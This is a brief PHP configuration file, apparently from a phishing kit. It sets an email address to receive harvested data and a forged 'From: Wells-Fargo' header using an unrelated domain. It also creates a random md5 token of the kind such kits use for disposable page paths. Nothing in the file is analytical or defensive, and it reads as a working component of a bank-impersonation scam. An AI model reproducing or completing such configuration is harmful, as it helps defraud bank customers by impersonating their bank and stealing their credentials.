<?php	

$email  = "naomi.drew88@zohomail.com"; // put your email here

$from = "From: Wells-Fargo - <wells@zillerrr.com>";

$praga = rand();
$praga = md5($praga);

?>